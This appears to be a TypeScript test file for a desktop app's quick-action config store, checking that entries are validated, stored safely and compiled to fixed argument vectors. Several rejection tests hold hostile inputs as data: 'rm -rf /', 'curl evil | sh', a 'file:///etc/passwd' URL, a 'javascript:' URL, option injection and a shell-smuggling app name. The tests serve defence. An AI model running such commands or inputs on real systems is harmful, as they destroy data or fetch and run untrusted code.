import { expect, test } from 'bun:test';
import { mkdtemp, readFile, stat, writeFile } from 'node:fs/promises';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { QuickActionConfigStore, quickActionArgs } from '../src/host/quick-actions.ts';

const tempRoot = () => mkdtemp('/tmp/myspace-quick-actions-');

test('a fresh install starts from the shipped entries', async () => {
  const store = new QuickActionConfigStore(await tempRoot());
  const config = await store.read();
  expect(config.items.map((item) => item.id)).toEqual(['finder', 'terminal', 'wiki']);
  expect(config.enabled).toEqual(['finder', 'terminal', 'wiki']);
  expect(config.order).toEqual(['finder', 'terminal', 'wiki']);
});

test('entries can be added, renamed and removed', async () => {
  const root = await tempRoot();
  const store = new QuickActionConfigStore(root);

  const added = await store.update({
    items: [
      { id: 'finder', label: '工作目录', target: { kind: 'path', path: join(homedir(), 'MySpace') } },
      { id: 'downloads', label: '下载', target: { kind: 'path', path: '~/Downloads' } },
      { id: 'docs', label: '腾讯文档', target: { kind: 'url', url: 'https://docs.qq.com' } },
    ],
    enabled: ['finder', 'downloads', 'docs'],
    order: ['docs', 'finder', 'downloads'],
  });
  expect(added.items.map((item) => item.id)).toEqual(['finder', 'downloads', 'docs']);
  expect(added.order).toEqual(['docs', 'finder', 'downloads']);
  // `~` is expanded on write, so what runs later is not shell-dependent.
  expect(added.items[1]!.target).toEqual({ kind: 'path', path: join(homedir(), 'Downloads') });

  const renamed = await store.update({
    items: added.items.map((item) => item.id === 'docs' ? { ...item, label: '文档' } : item),
  });
  expect(renamed.items.find((item) => item.id === 'docs')?.label).toBe('文档');

  const removed = await store.update({ items: renamed.items.filter((item) => item.id !== 'finder') });
  expect(removed.items.map((item) => item.id)).toEqual(['downloads', 'docs']);
  // Dropping an entry must also drop it from enabled/order, or the panel would
  // carry a row that resolves to nothing.
  expect(removed.enabled).not.toContain('finder');
  expect(removed.order).not.toContain('finder');

  expect((await stat(join(root, 'quick-actions.json'))).mode & 0o777).toBe(0o600);
});

test('file targets are accepted and compile to a fixed open argument', async () => {
  const store = new QuickActionConfigStore(await tempRoot());
  const config = await store.update({ items: [{ id: 'readme', label: 'README', target: { kind: 'file', path: '~/MySpace/README.md' } }] });
  expect(config.items[0]!.target).toEqual({ kind: 'file', path: join(homedir(), 'MySpace/README.md') });
  expect(quickActionArgs(config.items[0]!.target)).toEqual([join(homedir(), 'MySpace/README.md')]);
});

test('a target can only be a path, a file, an app, or an allowlisted URL', async () => {
  const store = new QuickActionConfigStore(await tempRoot());
  const entry = (target: unknown) => ({ items: [{ id: 'x', label: 'X', target }] });

  // The shape carries no command/shell variant at all, so these are rejected
  // for being unknown kinds rather than for matching a denylist.
  await expect(store.update(entry({ kind: 'command', command: 'rm -rf /' }))).rejects.toThrow('kind 只能是');
  await expect(store.update(entry({ kind: 'shell', script: 'curl evil | sh' }))).rejects.toThrow('kind 只能是');

  await expect(store.update(entry({ kind: 'url', url: 'file:///etc/passwd' }))).rejects.toThrow('协议不在允许列表内');
  await expect(store.update(entry({ kind: 'url', url: 'javascript:alert(1)' }))).rejects.toThrow('协议不在允许列表内');
  await expect(store.update(entry({ kind: 'path', path: 'relative/dir' }))).rejects.toThrow('必须是绝对路径');
  // A leading '-' would be read by `open` as an option, not an operand.
  await expect(store.update(entry({ kind: 'path', path: '-a/Applications/Evil.app' }))).rejects.toThrow('不能以 - 开头');
  await expect(store.update(entry({ kind: 'app', app: 'Terminal; rm -rf ~' }))).rejects.toThrow('应用名无效');

  await expect(store.update({ items: [{ id: 'Bad Id', label: 'X', target: { kind: 'path', path: '/tmp' } }] }))
    .rejects.toThrow('id 只能是');
  await expect(store.update({ items: [{ id: 'a', label: '', target: { kind: 'path', path: '/tmp' } }] }))
    .rejects.toThrow('名称必须是');
  await expect(store.update({
    items: [
      { id: 'dup', label: 'A', target: { kind: 'path', path: '/tmp' } },
      { id: 'dup', label: 'B', target: { kind: 'path', path: '/tmp' } },
    ],
  })).rejects.toThrow('id 重复');
});

test('every target compiles to a fixed argument vector, never a string', () => {
  expect(quickActionArgs({ kind: 'path', path: '/Users/x/MySpace' })).toEqual(['/Users/x/MySpace']);
  expect(quickActionArgs({ kind: 'app', app: 'Terminal' })).toEqual(['-a', 'Terminal']);
  expect(quickActionArgs({ kind: 'app', app: 'Terminal', path: '/tmp' })).toEqual(['-a', 'Terminal', '/tmp']);
  expect(quickActionArgs({ kind: 'url', url: 'obsidian://open?vault=MySpace' })).toEqual(['obsidian://open?vault=MySpace']);
});

test('enabled and order still only accept known ids', async () => {
  const store = new QuickActionConfigStore(await tempRoot());
  await expect(store.update({ enabled: ['finder', 'arbitrary'] })).rejects.toThrow('未知直达入口');
  await expect(store.update({ order: [{ id: 'finder' }] })).rejects.toThrow('未知直达入口');
});

test('a hand-edited file degrades per entry, not per panel', async () => {
  const root = await tempRoot();
  const store = new QuickActionConfigStore(root);
  await store.update({ items: [{ id: 'keep', label: '保留', target: { kind: 'path', path: '/tmp' } }] });

  // One broken entry among good ones: the good ones must still load, because
  // the alternative is an empty panel and no clue which line caused it.
  await writeFile(join(root, 'quick-actions.json'), JSON.stringify({
    items: [
      { id: 'keep', label: '保留', target: { kind: 'path', path: '/tmp' } },
      { id: 'broken', label: '坏的', target: { kind: 'command', command: 'whoami' } },
    ],
    enabled: ['keep', 'broken'],
    order: ['keep', 'broken'],
  }));
  expect((await store.read()).items.map((item) => item.id)).toEqual(['keep']);

  // Invalid JSON falls back to the shipped entries rather than throwing.
  await writeFile(join(root, 'quick-actions.json'), '{ not json');
  expect((await store.read()).items.map((item) => item.id)).toEqual(['finder', 'terminal', 'wiki']);
});

test('an older config without items keeps working', async () => {
  const root = await tempRoot();
  await writeFile(join(root, 'quick-actions.json'), JSON.stringify({ enabled: ['wiki'], order: ['wiki', 'finder'] }));
  const config = await new QuickActionConfigStore(root).read();
  expect(config.items.map((item) => item.id)).toEqual(['finder', 'terminal', 'wiki']);
  expect(config.enabled).toEqual(['wiki']);
  expect(config.order).toEqual(['wiki', 'finder', 'terminal']);
});

test('the stored file never carries a command field', async () => {
  const root = await tempRoot();
  const store = new QuickActionConfigStore(root);
  await store.update({ items: [{ id: 'a', label: 'A', target: { kind: 'app', app: 'Terminal', path: '~/MySpace' } }] });
  const raw = await readFile(join(root, 'quick-actions.json'), 'utf8');
  expect(raw).not.toContain('command');
  expect(raw).not.toContain('shell');
});
